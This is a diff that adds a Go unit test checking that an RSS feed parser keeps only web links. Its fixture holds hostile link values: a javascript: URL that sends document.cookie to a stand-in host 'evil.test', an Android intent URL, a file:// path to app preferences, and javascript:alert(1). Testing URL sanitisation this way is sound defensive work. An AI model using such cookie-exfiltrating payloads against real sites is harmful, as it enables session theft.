@@ -75,6 +75,41 @@ func TestParseFeedKeysAnEntryAcrossItsRevisions(t *testing.T) {
 	}
 }
 
+func TestParseFeedKeepsOnlyWebLinks(t *testing.T) {
+	feed, err := ParseFeed([]byte(`<?xml version="1.0"?><rss version="2.0"><channel><title>Mixed</title>
+<item><title>Script</title><link>javascript:fetch('https://evil.test/'+document.cookie)</link><guid>g1</guid></item>
+<item><title>Intent</title><link>intent://scan/#Intent;scheme=zxing;package=com.evil;end</link></item>
+<item><title>File</title><link>file:///data/data/io.ycvk.acorn/shared_prefs/a.xml</link></item>
+<item><title>Relative</title><link>/posts/1</link></item>
+<item><title>Web</title><link>HTTPS://blog.test/1</link></item>
+<item><link>http://blog.test/2</link></item>
+<item><link>javascript:alert(1)</link><pubDate>Fri, 02 Oct 2026 08:00:00 +0000</pubDate></item>
+</channel></rss>`))
+	if err != nil {
+		t.Fatal(err)
+	}
+	type entry struct{ key, title, url string }
+	var got []entry
+	for _, item := range feed.Items {
+		got = append(got, entry{item.Key, item.Title, item.URL})
+	}
+	want := []entry{
+		{"g1", "Script", ""},
+		{"intent://scan/#Intent;scheme=zxing;package=com.evil;end", "Intent", ""},
+		{"file:///data/data/io.ycvk.acorn/shared_prefs/a.xml", "File", ""},
+		{"/posts/1", "Relative", ""},
+		{"HTTPS://blog.test/1", "Web", "HTTPS://blog.test/1"},
+		{"http://blog.test/2", "http://blog.test/2", "http://blog.test/2"},
+		{"javascript:alert(1)", "(untitled)", ""},
+	}
+	if !slices.Equal(got, want) {
+		t.Fatalf("entries = %q\nwant %q", got, want)
+	}
+	if markdown := feedMarkdown(feed); strings.Contains(markdown, "](javascript:") || strings.Contains(markdown, "](intent:") {
+		t.Fatalf("markdown links a non-web address:\n%s", markdown)
+	}
+}
+
 func TestParseFeedRejectsOtherDocuments(t *testing.T) {
 	for _, body := range []string{
 		"<html><body>nope</body></html>",
